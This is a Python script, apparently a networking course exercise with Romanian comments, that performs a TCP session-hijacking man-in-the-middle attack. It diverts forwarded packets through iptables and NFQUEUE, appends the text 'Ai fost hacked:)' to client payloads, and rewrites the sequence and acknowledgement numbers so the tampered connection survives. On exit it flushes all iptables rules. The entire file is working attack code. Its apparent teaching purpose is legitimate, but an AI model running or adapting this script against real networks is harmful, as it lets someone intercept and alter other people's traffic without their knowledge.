# Resurse: curs (capitol 6)

import subprocess
from scapy.all import *
from netfilterqueue import NetfilterQueue as NFQ

# tine minte valorile vechi si noi pentru seq si ack
altered_seq = {}
altered_ack = {}

client_ip = "198.7.0.1"
server_ip = "198.7.0.2"


def proceseaza(packet):
    ip_packet = IP(packet.get_payload())

    if ip_packet.haslayer(TCP) and (ip_packet[IP].src == client_ip or ip_packet[IP].src == server_ip):
        tcp_layer = ip_packet[TCP]
        initial_seq = tcp_layer.seq
        initial_ack = tcp_layer.ack

        # ia noile valori pentru seq si ack
        new_seq = altered_seq.get(initial_seq, initial_seq)
        new_ack = altered_ack.get(initial_ack, initial_ack)

        if 'P' in tcp_layer.flags:  # e mesaj PSH trimis de client catre server
            # modificam mesajul
            original_payload = bytes(tcp_layer.payload)
            modified_payload = original_payload + b' Ai fost hacked:)'

            # memoram noile valori pentru seq si ack
            altered_seq[initial_seq + len(original_payload)] = new_seq + len(modified_payload)
            altered_ack[new_seq + len(modified_payload)] = initial_seq + len(original_payload)

            new_packet = IP(src=ip_packet[IP].src, dst=ip_packet[IP].dst
                            ) / TCP(sport=tcp_layer.sport, dport=tcp_layer.dport, seq=new_seq, ack=new_ack, flags=tcp_layer.flags
                            ) / Raw(modified_payload)

        elif tcp_layer.flags == 'A':  # e mesaj ACK trimis de server dupa ce a primit mesajul de la client
            new_packet = IP(src=ip_packet[IP].src, dst=ip_packet[IP].dst
                            ) / TCP(sport=tcp_layer.sport, dport=tcp_layer.dport, seq=new_seq, ack=new_ack, flags=tcp_layer.flags)

        else:
            new_packet = ip_packet

        send(new_packet)

    else:
        send(ip_packet)


if __name__ == '__main__':
    queue = NFQ()

    try:
        subprocess.run(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', '10'], check=True)
        queue.bind(10, proceseaza)
        queue.run()
    except KeyboardInterrupt:
        subprocess.run(['iptables', '--flush'], check=True)
        queue.unbind()